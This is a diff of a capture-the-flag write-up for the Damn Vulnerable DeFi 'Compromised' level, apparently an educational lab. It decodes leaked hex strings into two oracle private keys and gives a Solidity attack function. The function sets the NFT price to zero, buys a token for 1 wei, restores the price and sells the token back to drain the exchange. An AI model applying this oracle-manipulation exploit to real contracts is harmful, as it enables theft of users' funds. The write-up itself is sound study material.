@@ -380,25 +380,55 @@ function attack() public {
 To beat this level, we need to comply with
 
 ```solidity
+// drain the exchange
+assertEq(address(exchange).balance, 0);
+assertGt(msg.sender.balance, EXCHANGE_INITIAL_ETH_BALANCE);
 
+// player doesn't own any NFT
+assertEq(nftToken.balanceOf(msg.sender), 0);
+// median price doesn't vary
+assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
 ```
-
-In other words: Drain the pool, get all the funds.
 
 ### Solution
 
-???
+We can beat the level if we manage to sell an NFT to the exchange at 999 ETH. The problem being, how do we get one in the first place.
 
-* https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NGQgNDggNjggNmEgNGUgNmEgNjMgMzQgNWEgNTcgNTkgNzggNTkgNTcgNDUgMzAgNGUgNTQgNWEgNmIgNTkgNTQgNTkgMzEgNTkgN2EgNWEgNmQgNTkgN2EgNTUgMzQgNGUgNmEgNDYgNmIgNGUgNDQgNTEgMzQgNGYgNTQgNGEgNmEgNWEgNDcgNWEgNjggNTkgN2EgNDIgNmEgNGUgNmQgNGQgMzQgNTkgN2EgNDkgMzEgNGUgNmEgNDIgNjkgNWEgNmEgNDIgNmEgNGYgNTcgNWEgNjkgNTkgMzIgNTIgNjggNWEgNTQgNGEgNmQgNGUgNDQgNjMgN2EgNGUgNTcgNDUgMzU
-* https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NGQgNDggNjcgNzkgNGQgNDQgNjcgNzkgNGUgNDQgNGEgNmEgNGUgNDQgNDIgNjggNTkgMzIgNTIgNmQgNTkgNTQgNmMgNmMgNWEgNDQgNjcgMzQgNGYgNTcgNTUgMzIgNGYgNDQgNTYgNmEgNGQgNmEgNGQgMzEgNGUgNDQgNjQgNjggNTkgMzIgNGEgNmMgNWEgNDQgNmMgNjkgNWEgNTcgNWEgNmEgNGUgNmEgNDEgN2EgNGUgN2EgNDYgNmMgNGYgNTQgNjcgMzMgNGUgNTcgNWEgNjkgNTkgMzIgNTEgMzMgNGQgN2EgNTkgN2EgNGUgNDQgNDIgNjkgNTkgNmEgNTEgMzQK
+If we look at the set up of the oracle, we see that the sources are
+
+```solidity
+address[] memory sources = new address[](3);
+sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
+sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
+sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
+```
+
+And, that at the definition of the level [at damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/challenges/compromised/) we read
+
+> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:
+
+```bash
+HTTP/2 200 OK
+content-type: text/html
+content-language: en
+vary: Accept-Encoding
+server: cloudflare
+
+4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+```
+
+These two hex strings are base64 representations of 32 bytes numbers ([here](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NGQgNDggNjggNmEgNGUgNmEgNjMgMzQgNWEgNTcgNTkgNzggNTkgNTcgNDUgMzAgNGUgNTQgNWEgNmIgNTkgNTQgNTkgMzEgNTkgN2EgNWEgNmQgNTkgN2EgNTUgMzQgNGUgNmEgNDYgNmIgNGUgNDQgNTEgMzQgNGYgNTQgNGEgNmEgNWEgNDcgNWEgNjggNTkgN2EgNDIgNmEgNGUgNmQgNGQgMzQgNTkgN2EgNDkgMzEgNGUgNmEgNDIgNjkgNWEgNmEgNDIgNmEgNGYgNTcgNWEgNjkgNTkgMzIgNTIgNjggNWEgNTQgNGEgNmQgNGUgNDQgNjMgN2EgNGUgNTcgNDUgMzU) and [here](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NGQgNDggNjcgNzkgNGQgNDQgNjcgNzkgNGUgNDQgNGEgNmEgNGUgNDQgNDIgNjggNTkgMzIgNTIgNmQgNTkgNTQgNmMgNmMgNWEgNDQgNjcgMzQgNGYgNTcgNTUgMzIgNGYgNDQgNTYgNmEgNGQgNmEgNGQgMzEgNGUgNDQgNjQgNjggNTkgMzIgNGEgNmMgNWEgNDQgNmMgNjkgNWEgNTcgNWEgNmEgNGUgNmEgNDEgN2EgNGUgN2EgNDYgNmMgNGYgNTQgNjcgMzMgNGUgNTcgNWEgNjkgNTkgMzIgNTEgMzMgNGQgN2EgNTkgN2EgNGUgNDQgNDIgNjkgNTkgNmEgNTEgMzQK))
 
 ```
 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
 ```
 
+We can verify that the private keys are the ones of two trusted sources:
+
 ```bash
-# You can verify that the private keys are the ones of the trusted sources
 cast wallet address --private-key 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
 # 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
 
@@ -407,7 +437,45 @@ cast wallet address --private-key 0x208242c40acdfa9ed889e685c23547acbed9befc6037
 
 ```
 
-### Reference
+In other words, we can just `oracle.postPrice("DVNFT", 0);` for each of these sources, then being able to buy an NFT from the exchange for 1 wei.
+
+Putting all together:
+
+```solidity
+function attack(Vm vm) public {
+  // we got the private keys from the intercepted message
+  // IRL we use a script with the given keys instead of `vm.startPrank()`
+  vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+  oracle.postPrice("DVNFT", 0);
+  vm.stopPrank();
+
+  vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+  oracle.postPrice("DVNFT", 0);
+  vm.stopPrank();
+
+  // this function will call onERC721Received() below
+  exchange.buyOne{value: 1 wei}();
+
+  // returning to the price it was, so we can drain the exchange
+  vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+  oracle.postPrice("DVNFT", 999000000000000000000);
+  vm.stopPrank();
+
+  vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+  oracle.postPrice("DVNFT", 999000000000000000000);
+  vm.stopPrank();
+
+  // let's sell this token
+  token.approve(address(exchange), tokenId);
+  exchange.sellOne(tokenId);
+
+  // give the money to the player to beat the level
+  (bool success,) = msg.sender.call{value: address(this).balance}("");
+  success;
+}
+```
+
+### References
 
 * https://eips.ethereum.org/EIPS/eip-721
 * https://ethereum.org/en/developers/docs/standards/tokens/erc-721/
